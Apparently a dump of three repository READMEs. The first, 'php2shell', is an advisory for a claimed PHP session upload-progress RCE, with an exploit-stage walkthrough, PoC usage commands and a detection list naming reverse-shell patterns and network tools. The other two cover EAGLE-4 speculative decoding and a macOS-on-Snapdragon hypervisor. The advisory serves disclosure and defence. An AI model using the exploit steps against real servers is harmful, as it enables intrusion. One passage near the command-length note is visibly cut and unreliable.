items.readme: # php2shell — CVE-2026-109618 / CVE-2026-109619 > **Critical Advisory (CVSS v4.0: 9.2 - Critical):** On October 20, details of two pre-auth Remote Code Execution (RCE) flaws in the PHP core leaked online ahead of coordinated disclosure. Exploitation allows arbitrary command execution straight from the web server. --- ## Table of Contents - [Overview](#overview) - [Root Cause](#root-cause) - [Verification & Targets](#verification--targets) - [Affected PHP Versions](#affected-php-versions) - [Threat Landscape & Detection Guidance](#threat-landscape--detection-guidance) - [Behavioral Indicators & Suspicious Child Processes](#behavioral-indicators--suspicious-child-processes) - [Monitoring Recommendation](#monitoring-recommendation) - [Action Items for Organizations](#action-items-for-organizations) - [Proof of Concept (PoC)](#proof-of-concept-poc) - [Exploit Architecture & Stages](#exploit-architecture--stages) - [Target Requirements](#target-requirements) - [Usage & Parameters](#usage--parameters) - [Profiles & Offsets](#profiles--offsets) - [Mitigation & Source Patching](#mitigation--source-patching) - [1. Configuration Mitigation (Immediate Stopgap)](#1-configuration-mitigation-immediate-stopgap) - [2. Automated Quick-Fix Script](#2-automated-quick-fix-script) - [3. Source Code Patch (`session-upload-progress-counters.patch`)](#3-source-code-patch-session-upload-progress-counterspatch) - [4. Cloudflare WAF Custom Rules](#4-cloudflare-waf-custom-rules) - [5. FrankenPHP Caddyfile Configuration](#5-frankenphp-caddyfile-configuration) - [6. Lighttpd Configuration](#6-lighttpd-configuration) - [7. Apache Mitigation (ModSecurity & .htaccess)](#7-apache-mitigation-modsecurity--htaccess) - [Disclaimer](#disclaimer) --- ### Overview `php2shell` refers to two critical vulnerabilities (CVE-2026-109618 & CVE-2026-109619) affecting core PHP functionality. The primary demonstrated vector is a heap use-after-free (UAF) in the PHP core session upload progress mechanism leading to arbitrary code execution (`zend_call_function` / `system()`). - **Severity:** Critical (CVSS v4.0: 9.2) - **Impacted Versions:** Reports indicate PHP versions 5, 6, 7, and 8 may be affected. Fixes are primarily expected for currently supported PHP 8 branches, leaving end-of-life (EOL) versions (PHP 5.x, 7.x, 8.0, 8.1) exposed without official vendor patches. - **Industry Tracking:** Confirmed by security researchers (watchTowr reproduced CVE-2026-109618; monitoring by Huntress and Florian Roth / process-watcher). #### Root Cause PHP's upload progress handler (`php_session_rfc1867_callback` in `ext/session/session.c`) stores two raw `zval *` bucket pointers (`post_bytes_processed` and `current_file_bytes_processed`) directly in live `HashTable` structures. During request processing: 1. **Trigger:** A standard multipart `POST` request activates progress tracking with default configuration values (`session.upload_progress.enabled = 1`). 2. **Free:** A progress update cycle re-reads session data. The function `zend_hash_update()` destroys the previous data tree using the destructor `zval_ptr_dtor`, freeing the memory block. 3. **Reclaim:** The freed bucket memory is reclaimed. The dangling pointer is redirected to crafted `zend_fcall_info` and `zend_internal_function` structures. 4. **Execution:** PHP calls `zend_call_function()`, resulting in arbitrary system command execution. #### Verification & Targets - Confirmed on standard `php-src` builds (including versions 8.4.4 and 8.2.34). - Uses symbol offsets (`--syms`) between `zval_ptr_dtor` and `zend_call_function` to adapt to distribution-specific binary layouts (e.g., Debian Bookworm, Ubuntu Noble, Ubuntu Jammy). --- ### Affected PHP Versions The following table summarizes the PHP versions affected by **CVE-2026-109618** and **CVE-2026-109619**, along with their support and patch statuses: | PHP Branch | Status | Affected Versions | Fixed / Secure Version | Notes | | :--- | :--- | :--- | :--- | :--- | | **PHP 8.5** | Supported (Active) | < 8.5.12 | **8.5.12** | Emergency security release published | | **PHP 8.4** | Supported (Active) | < 8.4.27 | **8.4.27** | Emergency security release published | | **PHP 8.3** | Supported (Active) | < 8.3.36 | **8.3.36** | Emergency security release published | | **PHP 8.2** | Supported (Security Only) | < 8.2.35 | **8.2.35** | Emergency security release published | | **PHP 8.1** | End of Life (EOL) | All 8.1.x versions | No Official Patch (EOL) | Set `session.upload_progress.enabled = Off` or use ELS/distro backports | | **PHP 8.0** | End of Life (EOL) | All 8.0.x versions | No Official Patch (EOL) | Official support ended; configuration mitigation is mandatory | | **PHP 7.x** | End of Life (EOL) | All 7.0 - 7.4 versions | No Official Patch (EOL) | Core `ext/session` logic vulnerable; urgent mitigation or upgrade required | | **PHP 5.x** | End of Life (EOL) | 5.4.0+ (with RFC1867 progress tracking) | No Official Patch (EOL) | Official support ended; isolate host or disable upload progress | > [!WARNING] > PHP 8.1 and older End-of-Life (EOL) versions **do not receive** official security patches from the PHP Foundation. For these environments, immediately apply [`session.upload_progress.enabled = Off`](#1-configuration-mitigation-immediate-stopgap) or rebuild PHP from source using the provided C source patch. --- ### Threat Landscape & Detection Guidance Exploitation of `php2shell` typically manifests as anomalous child processes spawned directly by PHP worker processes (`php-fpm`, `php-cgi`, `php-cgi.exe`, `httpd`, `apache2`). #### Behavioral Indicators & Suspicious Child Processes Monitor and alert on PHP worker processes executing: - **Interactive Shells:** `/bin/sh`, `/bin/bash`, `cmd.exe`, `powershell.exe` - **Script Interpreters:** `python`, `perl` - **Network / Transfer Utilities:** `curl`, `wget`, `nc`, `certutil.exe` - **Common Reverse Shell Patterns:** `/dev/tcp/`, `fsockopen`, `mkfifo` - **Immediate Reconnaissance Commands:** `whoami`, `id`, `uname -a`, `ipconfig` #### Monitoring Recommendation For Linux-based web environments without an endpoint detection agent, tools like Florian Roth's free [process-watcher](https://github.com/Neo23x0/process-watcher) can be run in observe mode to flag unusual child process spawning in real time. --- ### Action Items for Organizations 1. **Inventory All PHP Environments:** - Public-facing web servers running applications like WordPress, Drupal, Joomla, or Magento. - Internal appliances, hosting panels (cPanel, Plesk), and bundled standalone binaries (`php.exe`, `php-cgi.exe`). 2. **Prepare for Patch Windows:** - Official emergency patches from PHP and downstream Linux distributions are scheduled for release around **Wednesday, October 21 at 14:00 UTC (10:00 AM ET)**. - Apply vendor updates immediately once released. 3. **Isolate End-of-Life (EOL) Installations:** - Environments running unsupported versions (PHP 5.x, 7.x, 8.0, 8.1) may not receive official upstream backports. - Restrict access via VPN, apply strict WAF rules, or disable public internet exposure. 4. **Incident Response & Investigation:** - If suspicious child processes or unexpected files are detected, isolate the host and preserve web server/PHP logs. - Inspect web roots and temporary directories (`/tmp`, `/var/tmp`) for dropped webshells or transient execution artifacts. --- ### Proof of Concept (PoC) A fully automated one-click remote exploit targeting **CVE-2026-109618** is available in [`poc_109618.py`](poc_109618.py). The exploit bypasses ASLR remotely using plain HTTP requests to achieve reliable arbitrary command execution. #### Exploit Architecture & Stages The attack chain consists of four sequential stages over HTTP: 1. **Stage 0 — HTTP Worker Rotation:** Aborts the current prefork worker over HTTP to ensure a clean heap state in the newly spawned worker child. 2. **Stage 1 — Heap Base Leak:** Induces an out-of-memory (OOM) condition via an oversized multipart field (`--huge-mb`, default `12MB`) to trigger uninitialized memory leakage through `Set-Cookie: PHPSESSID`, extracting the Zend MM 2MB-aligned chunk base. 3. **Stage 2 — Libphp Base Leak:** Exploits session serialization / HashTable allocation alignment to leak the `ZVAL_PTR_DTOR` function pointer via `Set-Cookie`, computing the base address of `libphp.so`. 4. **Stage 3 — Fake Reference & Arbitrary Execution:** Forges a fake `HashTable` structure embedded inside a 167-byte `zend_string` with `pDestructor` pointed directly to `zif_system` in `libphp.so`. The crafted reference overwrites `PS(http_session_vars)`. When PHP frees the session data, `zif_system` executes the supplied command. > [!NOTE] > The command is embedded directly inside a 167-byte live `zend_string` carrier (0x98 header + NUL byte limit), restricting inline command strings to **maximum 14 bytes** (`MAX_CMD = 14`). For longer commands, chain through a short trigger such as `sh/out/p1' --proof-file out/p1 # Execute command writing to webroot and verify via HTTP GET fetch python3 poc_109618.py -u http://127.0.0.1:8088/index.php -c 'id>p1.txt' --fetch /p1.txt ``` ##### Command-Line Options | Option | Description | Default | | :--- | :--- | :--- | | `-u`, `--url` | **(Required)** Target PHP endpoint URL | `None` | | `-c`, `--cmd` | Command to execute (maximum 14 bytes) | `id>/out/p1` | | `--proof-file` | Path to local proof file to check post-exploitation; `''` disables | `out/p1` | | `--fetch` | Relative HTTP path to `GET` after exploitation (e.g. if writing to webroot) | `""` | | `--profile` | Target build profile: `bookworm` (official `php:8.4.26-apache`) or `lab` (Apache 2.4.68) | `bookworm` | | `--zif-offset` | Offset of `zif_system` in `libphp.so` (hex format e.g. `0x43a870`) | Loaded from offsets file | | `--dtor-offset` | Offset of `ZVAL_PTR_DTOR` in `libphp.so` (hex format e.g. `0x613c50`) | Loaded from offsets file | | `--htdata-offset` | Chunk-relative offset of the 167-byte live string carrier | Profile dependent (`0x690d8` or `0x6e0d8`) | | `--offsets-file` | Path to load/store derived `libphp` offsets | `out/offsets.env` | | `--docker-container`| Docker container name to automatically derive offsets on localhost | `php2shell-target` | | `--no-auto-offsets` | Disable automatic offset extraction via Docker helper | `False` | | `--huge-mb` | Size in MB of the OOM payload; must exceed target `memory_limit` | `12` | | `--timeout` | Per-request network socket timeout in seconds | `30.0` | | `--retries` | Number of attempts per leak stage (stage 3 runs `retries + 2`) | `3` | | `--no-pre-rotate` | Skip the initial worker rotation (Stage 0) | `False` | | `--no-retry-rotate` | Do not rotate workers between failed stage attempts | `False` | | `-q`, `--quiet` | Suppress verbose output logging | `False` | #### Profiles & Offsets The exploit script supports profile-based presets: - **`--profile bookworm` (Default):** Calibrated for the official Docker library image `php:8.4.26-apache` running on Debian 12 (Bookworm) with Apache 2.4.69. - **`--profile lab`:** Calibrated for custom/minimal Apache 2.4.68 builds. When targeting local Docker containers (`127.0.0.1` / `localhost`), the script can automatically extract binary symbol offsets directly from the running container using `docker/offsets.py` and cache them in `out/offsets.env`. For remote targets where binary layout differs from Debian 12, provide `--zif-offset` and `--dtor-offset` manually. --- ### Mitigation & Source Patching Until official vendor packages are updated in your repositories, you can protect your environments using configuration changes, automated scripts, or by compiling PHP with the included source patch. #### 1. Configuration Mitigation (Immediate Stopgap) The vulnerability relies on PHP's session upload progress mechanism (`session.upload_progress.enabled`), which is enabled by default. Disabling this directive neutralizes the attack vector while preserving regular file upload functionality: In your `php.ini`: ```ini session.upload_progress.enabled = Off ``` Or for PHP-FPM pool configurations (e.g., `/etc/php/*/fpm/pool.d/www.conf`): ```ini php_admin_flag[session.upload_progress.enabled] = off ``` After modifying the configuration, reload/restart your web services (e.g. `systemctl reload php-fpm` or `systemctl reload apache2`). #### 2. Automated Quick-Fix Script A mitigation helper script is available under the [`quick-fix/`](quick-fix/) directory: - **Check Current Status:** ```bash sudo ./quick-fix/run.sh --check ``` - **Apply Mitigation (Dry Run):** ```bash sudo ./quick-fix/run.sh --dry-run ``` - **Apply Mitigation:** ```bash sudo ./quick-fix/run.sh ``` - **Revert Changes:** ```bash sudo ./quick-fix/run.sh --revert ``` #### 3. Source Code Patch (`session-upload-progress-counters.patch`) If you build PHP from source or maintain custom distribution packages, a C-level source patch is provided under [`patch/session-upload-progress-counters.patch`](patch/session-upload-progress-counters.patch). **What the patch fixes:** The patch resolves the root cause in `ext/session/session.c` and `ext/session/php_session.h`. Instead of maintaining vulnerable, raw `zval *` bucket pointers (`post_bytes_processed` and `current_file_bytes_processed`) into dynamic `HashTable` structures (which become dangling pointers when the hash table is cleared or re-allocated during upload progress updates), the patch: - Stores counters as direct `zend_long` primitives. - Introduces `php_session_rfc1867_sync_counters()` to safely resolve and update array entries without dangling references. **How to Apply the Patch:** 1. Navigate to the root of your `php-src` source directory: ```bash cd /path/to/php-src ``` 2. Test applying the patch (dry-run): ```bash # Using git (if building from a git clone) git apply --check /path/to/patch/session-upload-progress-counters.patch # OR using GNU patch patch -p1 --dry-run < /path/to/patch/session-upload-progress-counters.patch ``` 3. Apply the patch: ```bash # Using git git apply /path/to/patch/session-upload-progress-counters.patch # OR using GNU patch patch -p1 < /path/to/patch/session-upload-progress-counters.patch ``` 4. Recompile and install PHP: ```bash ./buildconf --force # if needed ./configure make -j"$(nproc)" sudo make install ``` 5. Restart your PHP runtime / web services: ```bash sudo systemctl restart php-fpm # or sudo systemctl restart apache2 ``` ##### Community Backports for EOL Versions (PHP 5.6, 7.4, 8.0, 8.1) For legacy systems that cannot immediately upgrade to supported PHP 8.2+ releases (e.g. legacy OpenCart, WordPress, or control panels running on PHP 5.6, 7.4, 8.0, or 8.1), dedicated backports combining the official PHP Group OOM fix with the root-cause counter sync are available: - 👉 **Repository:** [Anton-Barinov/php2shell-patches](https://github.com/Anton-Barinov/php2shell-patches) - Includes automated build scripts to compile isolated, side-by-side runtimes into `/opt/php--patched` without overwriting system packages, plus multi-PHP FPM pool hardening tools. #### 4. Cloudflare WAF Custom Rules Recommended Cloudflare WAF rule templates to filter malicious traffic are located in the [`cloudflare-rule-fix/`](cloudflare-rule-fix/) directory: - **Comprehensive multipart blocking (excluding legitimate upload routes)** - **Enterprise plan `PHP_SESSION_UPLOAD_PROGRESS` request body inspection** - *Note: Blocking requests based solely on the `PHPSESSID` cookie is strongly discouraged as it breaks valid user sessions.* Refer to [cloudflare-rule-fix/README.md](cloudflare-rule-fix/README.md) for full rule syntax and details. #### 5. FrankenPHP Caddyfile Configuration To disable the session upload progress mechanism globally in FrankenPHP environments, a Caddyfile snippet is provided. Add the contents of [`frankenphp/Caddyfile-snippet`](frankenphp/Caddyfile-snippet) to your global Caddyfile block: ```caddyfile { frankenphp { php_ini session.upload_progress.enabled 0 } } ``` #### 6. Lighttpd Configuration For environments running Lighttpd, you can block multipart requests (`POST`, `PUT`, `PATCH`) on virtual hosts or directories that do not accept file uploads using [`lighttpd/php2shell.conf`](lighttpd/php2shell.conf): ```lighttpd $HTTP["request-method"] =~ "^(POST|PUT|PATCH)$" { $REQUEST_HEADER["Content-Type"] =~ "(?i)^\s*multipart/form-data([;,[:space:]]|$)" { url.access-deny = ( "" ) } } ``` #### 7. Apache Mitigation (ModSecurity & .htaccess) Two mitigation options are provided for Apache environments: - **ModSecurity Rule:** Block requests containing the `PHP_SESSION_UPLOAD_PROGRESS` parameter using [`apache/modsecurity-php2shell.conf`](apache/modsecurity-php2shell.conf): ```apache SecRequestBodyAccess On SecRule ARGS_NAMES "@streq PHP_SESSION_UPLOAD_PROGRESS" \ "id:1026109618,phase:2,t:none,deny,status:403,log,\ msg:'php2shell: PHP_SESSION_UPLOAD_PROGRESS field blocked (CVE-2026-109618/109619)'" ``` - **`.htaccess` / mod_rewrite Rule:** For directories that do not require file uploads, block multipart requests before they reach the PHP interpreter using [`apache/.htaccess`](apache/.htaccess): ```apache RewriteEngine On RewriteCond %{REQUEST_METHOD} ^(POST|PUT|PATCH)$ [NC] RewriteCond %{HTTP:Content-Type} ^[[:space:]]*multipart/form-data([;,[:space:]]|$) [NC] RewriteRule ^ - [F,L] ``` --- ### Disclaimer This project is intended strictly for educational purposes and authorized security research. Use only in environments you own or have explicit permission to test. --- ### Author & Contact - **Website:** [https://enes.dev](https://enes.dev) - **Twitter / X:** [@enes_dev](https://x.com/enes_dev)

EAGLE-4

One Flexible Drafter for All Batch Sizes and Hardware

Paper (EAGLE-4) · EAGLE-4 draft for Qwen3.8-27B · Documentation


Figure 1(a) of the EAGLE-4 paper: Qwen3.8-27B on the SPEED-Bench qualitative split, 4× NVIDIA B300, one request, temperature 0. The numbers this release measured with EAGLE-4 are in the support matrix.

## EAGLE-4 **Leave speculation on. EAGLE-4 adapts to your hardware, batch and workload.** For high load, serve SGLang on four B300 GPUs with the [high-load recipe](docs/quickstart-sglang.md#high-load), which keeps pace with plain decoding up to 512 concurrent requests. EAGLE-4 (Extrapolation Algorithm for Greater Language-model Efficiency) speeds up LLM inference with speculative decoding. EAGLE-4 draft models are built to run with `eagle-harness`, which decides how far to speculate from measured costs on your setup, so every draft tree fits the batch size, the hardware and the workload. The output stays exactly what the target model would generate on its own: up to 3.4× faster generation on Qwen3.8-27B, with the same answers. [Measured speedups](#measured-speedup) This repository holds `eagle-harness`, the package that brings EAGLE-4 to SGLang, vLLM and TokenSpeed. Install it, point your engine at an EAGLE-4 draft model, and it serves with EAGLE-4. ## Quick start The quick start serves on one GPU and is tested on one NVIDIA B300 with Linux and a CUDA 13 driver. [Qwen3.8-27B](https://huggingface.co/Qwen/Qwen3.8-27B) and its [EAGLE-4 draft](https://huggingface.co/EAGLE-Corp/Qwen3.8-27B-EAGLE4) download on the first start (about 62 GB). The [measured speedups](#measured-speedup) use four B300 GPUs. Add `--tp-size 4` to either serve command to serve on four, and see the [engine guides](#more) for the exact measured commands. Start an SGLang server with Docker: ```bash docker run --gpus all --ipc host -p 127.0.0.1:30000:30000 \ -e HF_HOME=/hf -v ~/.cache/huggingface:/hf \ ghcr.io/eagle-hq/eagle-4-sglang:0.1.2 \ sglang serve --model-path Qwen/Qwen3.8-27B --host 0.0.0.0 \ --disable-overlap-schedule --speculative-algorithm EAGLE_HARNESS \ --speculative-draft-model-path EAGLE-Corp/Qwen3.8-27B-EAGLE4 \ --speculative-num-steps 12 --speculative-eagle-topk 4 --speculative-num-draft-tokens 16 \ --speculative-algorithm-config '{}' ``` Or install with pip, in Python 3.12. Pip installs also need the [CUDA toolkit and a C++ compiler](docs/install.md#requirements): ```bash python3.12 -m venv .venv && source .venv/bin/activate pip install "eagle-harness[sglang]" "sglang==0.5.23.dev252+eagle.5" \ --extra-index-url https://eagle-hq.github.io/EAGLE-4/whl/cu130/ \ --extra-index-url https://download.pytorch.org/whl/cu130 \ --extra-index-url https://pypi.nvidia.com ``` ```bash sglang serve --model-path Qwen/Qwen3.8-27B \ --speculative-algorithm EAGLE_HARNESS \ --speculative-draft-model-path EAGLE-Corp/Qwen3.8-27B-EAGLE4 ``` When the server logs `The server is fired up and ready to roll!`, send a request from another terminal: ```bash curl http://localhost:30000/v1/chat/completions -H 'Content-Type: application/json' \ -d '{"model": "Qwen/Qwen3.8-27B", "messages": [{"role": "user", "content": "Explain how a hash table works."}], "max_tokens": 256}' ``` For vLLM, TokenSpeed and AMD MI355X, follow the [engine guides](#more). ## Measured speedup Each speedup divides EAGLE-4 throughput by the same engine's throughput without speculation, on Qwen3.8-27B at temperature 0 on the SPEED-Bench client, with the measured recipe of each engine guide. The [support matrix](docs/support-matrix.md) has the tokens/s, the correctness checks and how each number was measured. | Engine | GPUs | 1 request | 8 concurrent | 64 concurrent | | --- | --- | ---: | ---: | ---: | | SGLang | 4× B300 | 3.42× | 2.09× | 1.39× | | vLLM | 4× B300 | 2.83× | 1.72× | 1.14× | | TokenSpeed | 4× B300 | 3.09× | 2.02× | 1.41× | On one AMD MI355X, SGLang with EAGLE-4 is 2.07× faster at 8 concurrent requests and 1.56× at 32. ## More - [Install](docs/install.md): pins, wheel indexes, Docker images and the ROCm closure. - Engine guides with the measured recipes: [SGLang](docs/quickstart-sglang.md), [vLLM](docs/quickstart-vllm.md), [TokenSpeed](docs/quickstart-tokenspeed.md), [AMD MI355X](docs/quickstart-amd.md). - [Support matrix](docs/support-matrix.md) and [known limits](docs/known-limits.md). - [Calibration](docs/calibration.md), [configuration](docs/configuration.md) and [troubleshooting](docs/troubleshooting.md). - [How it works](docs/architecture.md), [kernels](docs/kernels.md), [compatibility](docs/compatibility.md), [new models](docs/new-model.md) and the [FAQ](docs/faq.md). ## Citation If you use EAGLE-4, cite the EAGLE-4 paper. EAGLE-4 builds on EAGLE, EAGLE-2 and EAGLE-3, which [`CITATION.cff`](CITATION.cff) also lists. ```bibtex @misc{eagle4, author = {EAGLE-4 Team}, title = {{EAGLE-4}: One Flexible Drafter for All Batch Sizes and Hardware}, year = {2026}, note = {Preprint} } ``` ## Acknowledgements - Thanks to Aditya Nandakumar (@proaditya) and the contributors to the original EAGLE-4 PR 1 for the ROCm port of EAGLE-4 on AMD Instinct MI355X. - Thanks to Andy Luo (@andyluo7) and the contributors to the original EAGLE-4 PR 2 for the AMD AITER and Triton kernels on GFX950. - Thanks to Andy Luo (@andyluo7), Aditya Nandakumar (@proaditya) and the contributors to the merged AMD series in the original EAGLE-4 PR 4 for AITER/FA3 and Split-KV on GFX950. - Thanks to Nicolas Perrin (@nperrin-fr) and the TokenSpeed/LightSeek contributors for the TokenSpeed implementation in the original EAGLE-4 PR 3, including the MLP L2 warm-ahead and TGV SwiGLU work used in the TokenSpeed fork. - SPEED-Bench is by NVIDIA. items.title: Snapintosh/Snapintosh
items.description: EL2 hypervisor and toolchain that boots macOS on the ASUS A16 (Snapdragon X2 Elite), with an Adreno Metal/IOGPU stack
items.readme:
# Snapintosh ![Snapintosh — macOS on Snapdragon; ASCII hands reaching toward a red chip](docs/assets/snapintosh-ascii-chip-red.png) Snapintosh boots Apple's macOS 27 (build 26A428) on an ASUS Zenbook A16 laptop with a Qualcomm Snapdragon X2 Elite (X2E-96-100). It is an EL2 monitor (hypervisor) and the toolchain around it. The monitor runs Apple's stock kernelcache (the J700/T8140 kernel) unmodified by default. It supplies the platform contracts that the kernel expects from Apple silicon: the SPTM and TXM monitor calls, translation of the kernel's 16 KiB page tables, and the Apple devices the kernel looks for. Graphics run on the laptop's own Adreno X2-90 GPU through a driver stack written for this project: - **AdrenoMetal.bundle**: a Metal driver plug-in. - **AdrenoX2**: an IOGPU kernel extension, with **AdrenoDisplay** driving the internal panel. - **air2ir3**: a shader compiler that translates Apple's AIR (Metal's IR) into Mesa's ir3 for the Adreno. There is no software, CPU or paravirtual rendering path. The project also includes an I2C-HID keyboard and touchpad driver (SnapI2CHID), native QCC2072 Wi-Fi work, and NVMe storage through an emulated Apple storage controller. Snapintosh is used together with [q1n1](https://github.com/Snapintosh/q1n1), a UEFI EL2 proxy forked from Asahi Linux's m1n1. q1n1 takes the machine at EL2 after UEFI and serves m1n1's proxy protocol over USB-C to a Mac host, which drives Snapintosh from there. ## Status This is experimental software, written for one laptop model. | Area | State | | --- | --- | | macOS desktop on the A16 | Boots to the desktop with GPU acceleration. Rendering is correct: the pixel checks across the desktop test scenes pass. | | Smoothness | In progress. Interaction is usable but not yet smooth. The target is a steady ~60 Hz first and the panel's 120 Hz later. | | Input | The built-in keyboard and touchpad work, including trackpad gestures, Mission Control and app switching. | | Wi-Fi (QCC2072) | Scanning, a WPA2 connection, DHCP and ping work through a host-proxy harness driven from the Mac. Joining from the macOS Wi-Fi menu does not work yet. | | Storage | macOS is installed on, and boots from, the internal NVMe. | | Other hardware | Audio, cameras, Bluetooth, sleep and external displays are not supported. | [docs/STATUS.md](docs/STATUS.md) has the details, the known issues and the roadmap. ## Required hardware - An **ASUS Zenbook A16 with the Snapdragon X2 Elite X2E-96-100** (UX3607OA). Nothing else is supported. The monitor, device tables, clocks and register addresses are specific to this machine. - A **Mac host** running macOS 27, connected to the A16 over USB-C. q1n1 brings up a USB NCM network link on that cable, and every boot, upload and log capture goes over it. - AC power is strongly recommended. The tools refuse to boot or write the SSD below a battery threshold. ## Architecture in brief ```mermaid flowchart TD UEFI["A16 UEFI firmware"] --> Q1N1 Q1N1["q1n1: UEFI EL2 proxy
(USB-C NCM link to the Mac host)"] --> MON MON["Snapintosh EL2 monitor
SPTM/TXM call emulation, 16K-to-4K shadow page tables,
Apple device models (AIC, ANS2 NVMe, DART, ...), GPU ring and SMMU mediation"] --> XNU XNU["Stock macOS kernel at EL1 + AuxKC
(AdrenoX2 + AdrenoDisplay, SnapI2CHID, ...)"] --> USER USER["macOS userspace
WindowServer, Core Animation, apps
AdrenoMetal.bundle + air2ir3 compiler runtime"] HOST["Mac host: tools/cycle.py, q1n1 proxy client"] -. USB-C NCM .-> Q1N1 ``` ``` A16 UEFI -> q1n1 (EL2 proxy) -> Snapintosh monitor (EL2) -> XNU + AuxKC (EL1) -> userspace + Metal plug-in (EL0) ``` [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) explains each layer. ## Repository layout | Path | Contents | | --- | --- | | `compat/` | the EL2 monitor: SPTM/TXM contracts, CPU, interrupt, timer and device emulation, the GPU ring and SMMU mediation, the NVMe backend | | `shadow/` | the page-table walker and the 16 KiB guest to 4 KiB hardware shadow tables | | `probes/` | the code that runs on the target (loader, monitor entry) and the host-side image builder and runner | | `tools/` | firmware acquisition, kernelcache analysis, the boot-cycle tool (`cycle.py`), build helpers and the native test suites | | `gpu/adreno-kext/` | the AdrenoX2 kext (`kext/`, submodule [SnapAdreno](https://github.com/Snapintosh/SnapAdreno)), the AdrenoMetal plug-in (`plugin/`, submodule [SnapMetal](https://github.com/Snapintosh/SnapMetal)) and the shared register and contract headers (`include/`) | | `gpu/air2ir3/` | the AIR to ir3 shader compiler (submodule [air2ir3](https://github.com/Snapintosh/air2ir3)) | | `gpu/agx*` | an earlier virtual-AGX model, kept for reference | | `drivers/` | SnapI2CHID (`snap-i2c-hid/`, submodule [SnapI2CHID](https://github.com/Snapintosh/SnapI2CHID)), the QCC2072 Wi-Fi controller (`snap-qcc2072/`, submodule [SnapQCC2072](https://github.com/Snapintosh/SnapQCC2072)), the boot framebuffer, a loader test | | `config/` | monitor feature flags and guest launchd jobs | | `build/` | generated output (gitignored, apart from the AuxKC link helpers) | | `docs/` | design and reference documentation | ## Repositories Snapintosh is split across the [Snapintosh organization](https://github.com/Snapintosh). This umbrella repository holds the EL2 monitor, the host tools and the documentation, and mounts the components below as git submodules at the paths they always had, so every relative build path is unchanged. Clone it with its submodules: ```sh git clone --recurse-submodules https://github.com/Snapintosh/Snapintosh.git git clone https://github.com/Snapintosh/q1n1.git # next to it, at ../q1n1 ``` | Repository | Mounted at | Contents | | --- | --- | --- | | [Snapintosh](https://github.com/Snapintosh/Snapintosh) | (this repository) | EL2 monitor (`probes/`, `compat/`, `shadow/`), `tools/`, docs | | [q1n1](https://github.com/Snapintosh/q1n1) | `../q1n1` (separate checkout) | UEFI EL2 proxy and loader, a fork of Asahi Linux's m1n1 | | [SnapAdreno](https://github.com/Snapintosh/SnapAdreno) | `gpu/adreno-kext/kext` | Adreno X2-90 IOGPU and display kernel driver | | [SnapMetal](https://github.com/Snapintosh/SnapMetal) | `gpu/adreno-kext/plugin` | Metal driver plug-in (`AdrenoMetal.bundle`) | | [air2ir3](https://github.com/Snapintosh/air2ir3) | `gpu/air2ir3` | AIR to Mesa ir3 shader compiler kit | | [SnapI2CHID](https://github.com/Snapintosh/SnapI2CHID) | `drivers/snap-i2c-hid` | I2C-HID keyboard, touchpad and precision-touchpad driver | | [SnapQCC2072](https://github.com/Snapintosh/SnapQCC2072) | `drivers/snap-qcc2072` | QCC2072 Wi-Fi driver (work in progress) | A change to a component lands in its own repository first; the umbrella then moves the submodule pointer in a separate commit. ## Building You need: - a Mac with Xcode (macOS 27 SDK); - the Kernel Debug Kit for build 26A428, installed at `/Library/Developer/KDKs/KDK_27.0_26A428.kdk`; - Python 3; - Homebrew LLVM, Meson and Ninja for the shader compiler. Its Mesa checkout is fetched and patched by `gpu/air2ir3/tools/mesa-setup.sh`; - a q1n1 checkout next to this one (`../q1n1`). [docs/BUILDING.md](docs/BUILDING.md) has the steps. ## Bring your own Apple software This repository ships **no Apple, Qualcomm or ASUS binaries or firmware**. You supply them yourself: - **The macOS 27 restore image (IPSW).** Download it from Apple with `python3 tools/fetch-ipsw.py [destination]`. Then extract the J700 boot set (kernelcache, device tree, SPTM, TXM and others) with `python3 tools/extract-firmware.py j700ap`. Nothing runs without it. - **The Kernel Debug Kit** for 26A428, from Apple's developer downloads. - **Device firmware.** The Adreno GPU's GMU and SQE microcode (`gen80100_gmu.bin`, `gen80100_sqe.fw`) and the QCC2072 Wi-Fi firmware come from the linux-firmware project. The Wi-Fi board file (`bdwlan_qcc2072_1p0_ncm820A.elf`) comes from ASUS's Windows WLAN driver package for this model. The tools check each file against a pinned SHA-256. The project depends on Apple software that each user must obtain and use under Apple's terms. ## Warning Snapintosh is an experimental hypervisor that runs with full control of the machine. - **It writes the internal NVMe SSD.** Installing macOS changes the partition table, and the guest writes its own volumes. A bug can corrupt or destroy data on the SSD, including the Windows installation. Back up everything before you start, and keep a way to restore Windows. - It programs clocks, voltages, the GPU and memory-bandwidth votes directly. The tools refuse to run on low battery and stop the run when the SoC gets too hot (`--thermal-guard`), but those guards are not a guarantee. - It is not a supported or stable way to run macOS. Expect panics, hangs and cold reboots. Use it at your own risk. ## Legal Snapintosh is an independent project. It is not affiliated with, endorsed by or sponsored by Apple, Qualcomm, ASUS or Asahi Linux. macOS, Metal and Apple are trademarks of Apple Inc. Snapdragon and Adreno are trademarks of Qualcomm Incorporated. Zenbook is a trademark of ASUSTeK Computer Inc. All other trademarks belong to their owners. Running macOS on non-Apple hardware may conflict with Apple's macOS software licence agreement. You are responsible for making sure that your use complies with the licences that apply to you. ## License The project's own code is MIT licensed; see [LICENSE](LICENSE). Some components carry other licences. Generated Mesa register tables keep Mesa's MIT notice, and the QEMU tracer patch in `tools/qemu-sptm-oracle/` is GPL-2.0-or-later. [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md) and [LICENSES/](LICENSES/) list every third-party component and its licence text. ## Credits Snapintosh builds on the published work of others: - **Asahi Linux and m1n1.** q1n1 is a fork of m1n1, and Snapintosh uses m1n1's proxy protocol, its Apple-silicon constants and its RTKit/mailbox knowledge. - **Mesa and freedreno**, for the ir3 compiler that air2ir3 builds on, the Adreno register database and the a6xx/a8xx driver code used as reference. - **The Linux msm/drm, clk/qcom, ath12k, i2c-hid and GENI driver authors.** Their drivers were read as hardware references. Snapintosh's drivers are written from the interface facts, and one generated table is derived from Linux's Adreno catalogue (see the notices). - **jprx**, for [qemu-sptm](https://github.com/jprx/qemu-sptm) and [darwin-vm](https://github.com/jprx/darwin-vm), used to observe Apple's real SPTM/TXM as ground truth. - **XNU** sources from Apple Open Source, for reading the kernel's side of each contract. [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md) has the complete list. ## Documentation | Read | For | | --- | --- | | [docs/STATUS.md](docs/STATUS.md) | what works, known issues, roadmap | | [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) | how the layers fit together, including the GPU stack and Wi-Fi | | [docs/BUILDING.md](docs/BUILDING.md) | building the monitor, 